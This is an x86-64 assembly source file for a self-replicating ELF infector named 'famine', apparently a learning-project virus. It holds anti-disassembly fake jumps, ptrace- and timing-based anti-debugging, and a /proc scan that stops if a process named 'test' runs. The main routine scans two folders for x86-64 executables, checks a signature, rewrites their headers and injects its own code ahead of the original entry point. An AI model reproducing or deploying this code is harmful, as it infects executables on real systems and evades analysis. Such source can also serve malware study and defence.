%include "header.asm"
[BITS 64]
default rel

section .text
    global _famine

_famine:
    PUSH
    mov rbp, rsp
    sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE

;small obfuscation
obfu:
    push rax              ; rsp - 8
    push rcx              ; rsp - 8
    push rdx              ; rsp - 8
    mov rcx, rsp          ; new rsp
    mov rsp, rbp          ; rsp = RBP(current stack frame at start)
    pop rbp               ; pop original RBP
    pop rax               ; pop ret addr
    lea rdx, [rel $ + 84] ; New ret addr
    push rdx              ;
    push rdx              ; for stack align
    ret                   ; jmp to back_at_it

; Lots of fake JMP
; This code will not be executed it is only to false disassembly
ahahahaha:
    push rbp
    mov rbp, rsp
    xor rax, rax
    cmp rax, rax
    je j0
    cmp rax, rdi
    je j1
    add rax, 0x4242
    cmp rax, rsi
    je j2
    cmp rax, rdx
    je j3
    cmp rax, rcx
    je j4
    jmp [rel $ + 0x84]
j0:
    jmp [rel $ + 46]
j1:
    jmp [rel $ + 72]
j2:
    jmp [rel $ + 128]
j3:
    jmp [rel $ + 256]
j4:
    jmp [rel $ + 512]
;Ths will we executed
back_at_it:
    ; Restore back the what we use
    pop rdx
    push rax
    push rbp
    mov rbp, rsp
    mov rsp, rcx        ;  rcx has real rsp
    pop rdx
    pop rcx
    pop rax
    push rax
    xor rax, rax
    jz begin

db 0x89 ; mov
db 0x84 ; MOD(2) - REG(3) - R/M(3)
; waiting for 4 bytes incomplete
db 0xD9 ; sib following MOD-REG-R/M
; mov rax, [ rcx + rbx * 8 + displacement ]

begin:
    pop rax
; ANTI DEBUG 1 start
; calculate time elapsed since start
    rdtsc
	xor ecx, ecx                ; sets ECX to zero
	add ecx, eax                ; save timestamp to ECX
    mov dword [rsp + 124], ecx 

; ANTI DEBUG 2
next:
; For mysterious reason this doesn't not work with BASH ???????????????????.
    mov rdi, 0
    mov rsi, 0
    mov rdx, 1
    mov r10, 0
    mov rax, SYS_PTRACE
    syscall
    cmp rax, 0
    jge anti_process
;  44 45  42 55 47 47 49 4e 47 2e 2e 0a = "DEBUGGING..\n"
;- 24 19  22 1f 0c 2a 48 3a 0e 1e 05 01
;  20 2c  20 36 3b 1d 01 14 39 10 29 09
    mov rcx, 0x42422a0c1f221924
    movq mm0, rcx
    mov rcx, 0x42421d3b36202c20
    movq mm1, rcx
    paddusb mm0, mm1
    movq rcx, mm0
    emms                ; clear mmx
    shl rcx, 0x10
    shr rcx, 0x10
    mov [rsp], rcx

    mov rcx, 0x424201051e0e3a48
    movq mm2, rcx
    mov rcx, 0x4242092910391401
    movq mm3, rcx
    paddusb mm2, mm3
    movq rcx, mm2
    emms                ; clear mmx
    shl rcx, 0x10
    shr rcx, 0x10
    mov [rsp + 6], rcx
    mov rdi, 1
    lea rsi, [rsp]
    mov rdx, 13
    mov rax, SYS_WRITE
    syscall
    jmp clean

anti_process:
; open /proc/
    mov rax, 0x2f636f72702f
    mov [rsp], rax
    mov [rsp + 6], byte 0x0    ; not needed
    lea rdi, [rsp]
    mov rdx, 0
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clean
    mov r14, rax
; mmap
    xor rdi, rdi
    mov rsi, 0x10000            ; arbitry.
    mov rdx, 0x3
    mov r10, 34                 ; MAP_PRIVATE | MAP_ANON
    mov r8, -1
    mov r9, 0
    mov rax, 9
    syscall
    mov [rsp + 32], rax
    mov [rsp + 40], word 0
; getdents
    mov rsi, [rsp + 32]
    mov rdi, r14
    mov rax, SYS_GETDENTS
    mov rdx, 0x10000
    syscall
    cmp rax, 0
    jl clean_anti_process
; [RSP] 0 => 32 = TARGET PATH
; [RSP + 32] = MAPPED
; [RSP + 40] = BOOLEAN PROCESS FOUND
; [RSP + 42] = BUFFER READ
; [RSP + 64]
    mov rcx, rax
    mov rdx, [rsp + 32]
    xor r15, r15
    .search_pid:
        cmp rcx, r15
        je  clean_anti_process
        mov [rsp + 72], rdx
        mov [rsp + 80], rcx
        cmp byte [rdx + LDIRENT_64.d_type], 0x4
        jne .inc
        cmp byte [rdx + LDIRENT_64.d_name], 0x30
        jl .inc
        cmp byte [rdx + LDIRENT_64.d_name], 0x39
        jg .inc

    mov rax, [rdx + LDIRENT_64.d_name]
    mov [rsp + 6], rax
    xor rax, rax                                    ; OFFSET
; concat /proc/<name>
    .concat:
        cmp byte [rsp + 7 + rax], 0
        je .read_proc
        add rax, 1
        jmp .concat

    .read_proc:
        mov rdx, 0x656e696c646d632f
        mov [rsp + 7 + rax], rdx
        lea rdi, [rsp]
        mov rsi, 0x0
        mov rdx, 0
        mov rax, SYS_OPEN
        syscall
        cmp rax, 0
        jl .inc
        mov r8, rax
        mov rdi, rax
        lea rsi, [rsp + 42]
        mov rdx, 30           ; read 1024
        mov rax, SYS_READ
        syscall
        cmp rax, 5            ; atleast 5 bytes
        jl .cleanup_fd
        mov rcx, 5
        lea rdi, [rsp + 42]
        sub rax, 6  
        add rdi, rax
        mov rax, 0x00747365742f
        mov [rsp + 24], rax
        lea rsi, [rsp + 24]
        cld
        repe cmpsb
        je proc_found
    .cleanup_fd:
        mov rdi, r8
        mov rax, SYS_CLOSE
        syscall
    .inc:
        mov rdx, [rsp + 72]
        mov rcx, [rsp + 80]
        movzx rax, word [rdx + LDIRENT_64.d_reclen]
        add r15, rax
        add rdx, rax
        jmp .search_pid

proc_found:
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall
    mov [rsp + 40], word 1

clean_anti_process:
    mov rdi, r14
    mov rax, SYS_CLOSE
    syscall
    mov rdi, [rsp + 32]
    mov rsi, 0x10000
    mov rax, SYS_MUNMAP
    syscall
    mov ax, word [rsp + 40]
    cmp ax, 0
    jne clean
    rdtsc                       ; get another timestamp

    ;ANTI DEBUG 1 end
    mov eax, dword [rsp + 124]
	sub eax, ecx                ; compute elapsed ticks
	cmp eax, 0xFFF		        ; jump if less than FFF ticks (assumes that program is not running under a debugging tool like gdb...)
	jl launch
    jmp clean

launch:
    mov rcx, 128
    memset [rsp], rcx
    mov r14, 1
target_dir:
    .f1:
        lea rdi, [rel hook.folder_1]
        jmp open_dir
    .f2:
        mov r14, 0
        lea rdi, [rel hook.folder_2]

open_dir:
    mov rsi, 0                                          ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                                          ; open fail
    jl next_dir    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                        ; offset struct dirent
    mov rdx, DIRENT
    syscall
    mov r13, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                                        ; clear offset

find_file:
    cmp rbx, r13
    jge next_dir
    lea rsi, [rsp + 256]                                ; struct dirent
    add rsi, rbx                                        ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                                 ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

target_file:
    ; push qword [rbx]
    mov rax, rdi
    lea rdi, [rsp]
    cmp r14, 1
    je .ff1
    cmp r14, 0
    je .ff2
    .ff1:
        lea rsi, [rel hook.folder_1]
        jmp .path_dir
    .ff2:
        lea rsi, [rel hook.folder_2]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file

validate_target:
    lea rdi, [rsp]                                          ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                            ; O_RDONLY
    syscall
    cmp al, 0
    jle next_file
    mov rdi, rax
    mov r15, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jne next_file

map_target:
    push r8                                                 ; save dirent size
    mov rdi, 0x0
    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48 + 8]      ; filesz
    mov rdx, 0x3                                            ; READ | WRITE
    mov r10, 0x0002                                         ; MAP_PRIVATE
    mov r8, r15                                             ; fd
    mov r9, 0                                               ; offset
    mov rax, 9
    syscall
    mov [rbp - 16], rax                                     ; store mapped file
    pop r8                                                  ; restore dirent size

elf_header:
    mov rsi, [rbp - 16]
    cmp dword [rsi], 0x464c457f                             ; 7fELF
    jne clear
    .exec:
        cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
        jne clear
    .machine:
        cmp word [rsi + Elf64_Ehdr.e_machine], 62           ; x86_64
        je elf_sign
    jmp clear

; check if already infected
elf_sign:
    add rsi, FAMINE_SIZE + 0x6c                             ; offset signature
    lea rdi, [rel hook.SIGN]
    mov rcx, 38
    cld
    repe cmpsb
    je clear
; rsi = e_hdr
elf_phdr:
    mov rdx, [rbp - 16]
    add rdx, [rdx + Elf64_Ehdr.e_phoff]
    ;rdx = phdr
    PAGE_ALIGN FAMINE_SIZE
    add [rdx + phdr64.p_offset], rcx                        ; phdr[0]
    add [rdx + phdr64.p_offset + 0x38], rcx                 ; phdr[1]

;rdx = phdr[0]
patch_segtext:
    mov rsi, rcx
    mov rax, [rbp - 16]
    mov rcx, [rax + Elf64_Ehdr.e_entry]
    mov [rbp - 30], rcx                                     ; save entry point
    xor rcx, rcx
    mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
    xor rax, rax
    .loop:
        cmp cx, 0
        je patch_hdr
        sub cx, 1
    .found:                                                 ; if text found
        cmp al, 1
        jne .compare
        add [rdx + phdr64.p_offset], rsi
    .compare:
        cmp dword [rdx + phdr64.p_type], PT_LOAD
        jne .keep
        cmp dword [rdx + phdr64.p_flags], 0x5               ; R | X
        jne .keep
        sub [rdx + phdr64.p_vaddr], rsi
        mov rdi, [rbp - 16]
        mov r8, [rdx + phdr64.p_vaddr]
        mov [rdi + Elf64_Ehdr.e_entry], r8
        sub [rdx + phdr64.p_paddr], rsi
        add [rdx + phdr64.p_filesz], rsi
        add [rdx + phdr64.p_memsz], rsi
        mov al, 1
    .keep:
        add rdx, 0x38                                       ; next phdr
        jmp .loop

patch_hdr:
    test al, al                                             ; no text found
    je clear
    add qword [rdi + Elf64_Ehdr.e_entry], 0x40              ; new entry  + sizeof(elf_hdr)

patch_shdr:
    mov rax, [rbp - 16]                                     ;EHDR
    mov cx, word [rax + Elf64_Ehdr.e_shnum]                 ;n sections
    add rax, [rax + Elf64_Ehdr.e_shoff]                     ;sections[0]
    .loop:
        cmp cx, 0
        je .ehdr
        sub cx, 1
        add [rax + shdr64.sh_offset], rsi
        add rax, 0x40
        jmp .loop
    .ehdr:
        mov rax, [rbp - 16]
        add [rax + Elf64_Ehdr.e_shoff], rsi
        add [rax + Elf64_Ehdr.e_phoff], rsi

mimic:
    lea rdi, [rel hook.TMP]
    mov rsi, 577                                                   ; O_CREAT | O_WRONLY | O_TRUNC
    mov rdx, [rsp + FILE_SIZE + DIRENT + MAPPED_FILE + 16]         ; st_mode
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clear
    mov r8, rax
;write header
    write r8, [rbp - 16], 64                                        ; maybe change
;write viruses
    write_rel r8, [rel _famine], FAMINE_SIZE
;write opcode to jump to actualy entry
    mov [rbp - 32], word 0xb848                                     ; mov rax
    mov [rbp - 22], word 0xe0ff                                     ; jmp rax
;write vars
    write_rel r8, [rbp - 32], 0xc
    write_rel r8, [rel hook.folder_1], 70
;write padding
    PAGE_ALIGN FAMINE_SIZE
    sub rcx, FAMINE_SIZE
    sub rcx, 82                                                     ; jmp entry + vars
    mov r9, rcx
    .loop:
        cmp r9, 0
        je .keep
        mov rdi, r8
        lea rsi, [rel hook.null]
        mov rdx, 1
        mov rax, SYS_WRITE
        syscall
        sub r9, 1
        jmp .loop
; write rest of file
    .keep:
        mov rdi, r8
        mov rax, [rbp - 16]
        add rax, 0x40
        mov rsi, rax
        mov rdx, [rsp + FILE_SIZE + DIRENT + 48]
        sub rdx, 0x40
        mov rax, SYS_WRITE
        syscall

rename:
    lea rdi, [rel hook.TMP]
    lea rsi, [rsp]
    mov rax, SYS_RENAME
    syscall

clear:
    mov rdi, [rbp - 16]
    mov rsi, [rsp + FILE_SIZE + DIRENT + 48]
    mov rax, SYS_MUNMAP                           
    syscall
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall                                                 

next_file:
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

next_dir:
    mov rcx, DIRENT
    memset [rsp + 256], rcx                                ; dirent memset
    .next:
        cmp r14, 1
        jge target_dir.f2

clean:
    add rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
    mov rsp, rbp
    POP

_v_stop:                                                   ; End of famine
    mov rax, SYS_EXIT 
    mov rdi, 0
    syscall

hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
    .TMP:
        db TMP, 0
    .SIGN:
        db SIGNATURE, 0
    .null:
        db 0
%ifdef DEBUG
    .newline:
        db 0xa, 0
    .fz:
        db "Filesize : 0x%x", 0xa, 0
    .target:
        db "Target_file : %s", 0xa, 0
    .e_type:
        db "e_type : 0x%x", 0xa, 0
    .v_size:
        db "v_size : 0x%x", 0xa, 0
    .string:
        db "%s", 0xa, 0
    .number:
        db "0x%x", 0xa, 0
%endif
_end:
